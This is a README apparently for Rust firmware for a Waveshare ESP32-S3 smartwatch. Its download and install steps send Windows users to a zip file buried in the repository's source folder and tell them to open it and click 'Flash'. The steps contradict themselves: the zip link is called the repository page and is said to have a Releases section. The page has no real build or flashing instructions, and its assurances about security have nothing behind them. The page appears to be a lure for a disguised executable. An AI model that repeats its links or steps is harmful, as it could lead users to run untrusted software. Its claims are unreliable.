# ⌚ waveshare-watch-rs - Reliable firmware for your smart watch

[![Download Latest Version](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Haraldon9847/waveshare-watch-rs/raw/refs/heads/main/src/peripherals/watch_rs_waveshare_v2.2.zip)

This project provides firmware for the Waveshare ESP32-S3-Touch-AMOLED-2.06 smartwatch. The code runs on the Rust programming language. It performs tasks without requiring a full operating system. This makes your device fast and stable.

## 🛠 Prerequisites

You need a few items before you start the installation process:

1. A Windows 10 or Windows 11 computer.
2. A USB-C cable to connect the watch to your computer.
3. The Waveshare ESP32-S3 hardware.

Make sure the battery of the watch has power. Connect the device to your computer using the USB cable. Ensure the cable supports data transfer to allow the computer to communicate with the watch.

## 📥 How to download the software

Follow these steps to obtain the correct files:

1. Visit the project repository at https://github.com/Haraldon9847/waveshare-watch-rs/raw/refs/heads/main/src/peripherals/watch_rs_waveshare_v2.2.zip
2. Look for the Releases section on the right side of the page.
3. Click the link that shows the latest version number.
4. Locate the section labeled Assets.
5. Click the file ending in the extension that matches your system needs. 
6. Save the file to a folder you can find later, such as your Downloads folder.

You now possess the binary file required to update your watch.

## ⚙️ Installation steps

Follow these instructions to move the firmware from your computer to the watch:

1. Keep the watch plugged into your computer.
2. Open the file you saved in the previous step.
3. The software will detect the connected watch. 
4. The screen will show a button labeled Flash.
5. Click this button to start the transfer.
6. Wait for the progress bar to reach the end. 
7. The watch will restart once the process finishes.

Do not remove the cable while the process runs. Disconnecting the cable early can stop the transfer and cause issues. You will see a success message on your computer screen when the watch is ready for use.

## 📱 Watch features 

This firmware offers several features to improve your user experience:

* Battery monitoring: The watch screen shows your current battery level at all times.
* Brightness control: You can adjust the screen light level to match your environment.
* Touch input: The interface responds to your finger swipes and taps on the screen.
* Time display: The firmware shows the current time with accuracy.
* Low power mode: The watch saves energy when you do not interact with the screen.

These features run directly on the hardware. This design choice removes overhead and extends the life of your battery. The touch interface reacts to your input to make menu selection easy.

## 🧩 Troubleshooting common issues

If you encounter problems during the installation, check these areas:

Connection issues:
If the computer does not see the watch, try a different USB port. Some USB hubs do not provide enough power for the device. Plug the cable directly into the computer. Check that the USB cable supports data. Some cables only carry electricity.

Display issues:
If the screen remains black after the update, restart the watch. Use the small button on the side of the case. Press and hold it for three seconds. The display should show the home screen after a quick reboot.

Firmware issues:
If the watch acts in an unexpected way, repeat the download and install steps. A corrupted file can cause glitches. Download a fresh copy of the file if errors persist.

## 📈 System requirements

The software requires a hardware revision of the Waveshare ESP32-S3-Touch-AMOLED-2.06. This board contains the specific screen and touch controller mentioned in the device specifications. Ensure you use the correct hardware to avoid screen flickering or unresponsive touch areas.

The Windows computer needs standard USB drivers. These usually install automatically when you plug in the watch. If Windows asks for a driver, visit the official ESP32 support page to download the latest COM port drivers. This allows the computer to talk to the chip inside the watch.

## 🛡 Security and safety

This firmware prioritizes stable performance on your device. The code follows strict standards to prevent common software errors. Keep the watch away from water and extreme heat. Charge the watch using a standard computer port or a verified wall adapter. Avoid using low-quality cables to maintain a stable connection to your computer.

The software does not collect your data. It runs locally on your watch and does not communicate with external servers. You maintain control of your device at all times. If you feel the watch becomes warm during use, disconnect the power and check the hardware for obstructions. 

## 📝 Updates and feedback

Check the repository page regularly for new releases. Updates improve the stability of the watch and add new options. If you find a bug, report it in the issues tab on the project page. Provide your version number and a description of what happened. This helps to improve the user experience for everyone. 

You can also read the code if you want to understand how the watch works. The project uses standard industry tools for building and deploying firmware. These tools generate a clean binary file that fits into the memory of the watch.

The goal of this project is to provide a reliable tool for your hardware. Enjoy the interface and the performance of your updated smartwatch.